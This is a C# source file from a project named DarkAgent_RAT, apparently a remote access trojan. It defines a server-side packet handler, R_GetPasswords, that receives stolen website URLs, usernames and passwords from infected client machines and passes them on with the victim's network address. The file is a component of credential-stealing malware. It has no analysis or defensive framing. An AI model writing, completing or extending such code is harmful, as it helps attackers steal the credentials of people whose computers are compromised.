using System;
using System.Collections.Generic;
using System.Text;
using DarkAgent_RAT.src.Objects;
using DarkAgent_RAT.src.Events;

namespace DarkAgent_RAT.src.Network.DataNetwork.Packets.Receive
{
    class R_GetPasswords : ReceiveBasePacket
    {
        public R_GetPasswords(RatClients client, byte[] packet)
            : base(client, packet)
        {
        }

        PasswordInfo info = new PasswordInfo();
        public override void Read()
        {
            info.URL = ReadString();
            info.Username = ReadString();
            info.Password = ReadString();
        }

        public override void Run()
        {
            PasswordEventArgs e1 = new PasswordEventArgs(info, Client.RemoteEndPoint.ToString());
            PasswordEvent.OnGetPasswords(e1);
            info = null;
        }
    }
}